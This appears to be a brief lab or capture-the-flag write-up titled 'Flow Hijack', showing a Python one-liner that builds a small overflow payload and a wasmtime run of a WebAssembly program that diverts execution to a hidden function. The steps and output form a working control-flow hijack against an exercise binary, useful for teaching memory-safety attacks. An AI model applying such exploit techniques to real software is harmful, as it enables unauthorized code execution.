# Flow Hijack
1. **Create the payload**
```
python3 -c 'open("payload.bin", "wb").write(4 * b"A" +  b"\x06")
```

2. **Run the program with the payload**
```
$ wasmtime run main.wasm $(cat payload.bin)
I have a very secret function right here: 0x6
uid=1000(kali) gid=1000(kali) groups=1000(kali) AH got you! Wait how did you get in here anyway?   
```